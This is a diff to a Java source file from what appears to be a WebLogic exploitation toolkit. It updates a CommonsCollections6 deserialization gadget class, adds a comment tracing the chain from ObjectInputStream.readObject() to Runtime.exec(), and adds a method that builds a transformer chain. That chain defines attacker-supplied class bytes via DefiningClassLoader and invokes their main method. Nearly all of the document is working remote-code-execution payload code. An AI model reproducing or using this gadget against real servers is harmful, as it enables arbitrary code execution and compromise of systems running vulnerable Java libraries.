@@ -1,8 +1,24 @@
+/*
+ * Copyright (c) 2020. r4v3zn.
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ * http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
 package com.weblogic.framework.gadget.impl;
 
 import com.weblogic.framework.annotation.Authors;
 import com.weblogic.framework.annotation.Dependencies;
-import com.weblogic.framework.gadget.ObjectPayload;
+import com.weblogic.framework.entity.GadgetParam;
+import com.weblogic.framework.gadget.ObjectGadget;
 import com.weblogic.framework.utils.ReflectionUtils;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -10,8 +26,6 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import org.mozilla.classfile.DefiningClassLoader;
-
 import java.io.Serializable;
 import java.lang.reflect.Field;
 import java.net.URLClassLoader;
@@ -22,12 +36,24 @@ import java.util.Map;
 /**
  * Title: CommonsCollections6Gadget
  * Desc: CommonsCollections6 Gadget
+ * Gadget chain:
+ *     java.io.ObjectInputStream.readObject()
+ *         java.util.HashSet.readObject()
+ *             java.util.HashMap.put()
+ *             java.util.HashMap.hash()
+ *                 org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+ *                 org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+ *                     org.apache.commons.collections.map.LazyMap.get()
+ *                         org.apache.commons.collections.functors.ChainedTransformer.transform()
+ *                         org.apache.commons.collections.functors.InvokerTransformer.transform()
+ *                         java.lang.reflect.Method.invoke()
+ *                             java.lang.Runtime.exec()
  * Date:2020/3/29 0:35
  * @version 1.0.0
  */
 @Authors({Authors.R4V3ZN})
 @Dependencies({":commons-collections:commons-collections:3.1"})
-public class CommonsCollections6Gadget implements ObjectPayload<Serializable> {
+public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {
 
     /**
      * 获取序列化 payload (Runtime)
@@ -67,6 +93,23 @@ public class CommonsCollections6Gadget implements ObjectPayload<Serializable> {
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                 new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, codeByte}),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
+                new ConstantTransformer(1) };
+        return getObject(transformers);
+    }
+
+    @Override
+    public Serializable getObject(GadgetParam param) throws Exception {
+        String className = param.getClassName();
+        URLClassLoader urlClassLoader = param.getUrlClassLoader();
+        byte[] bytes = param.getCodeByte();
+        String[] bootArgs = param.getBootArgs();
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Class.forName("org.mozilla.classfile.DefiningClassLoader")),
+                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
+                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
+                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, bytes}),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
                 new ConstantTransformer(1) };
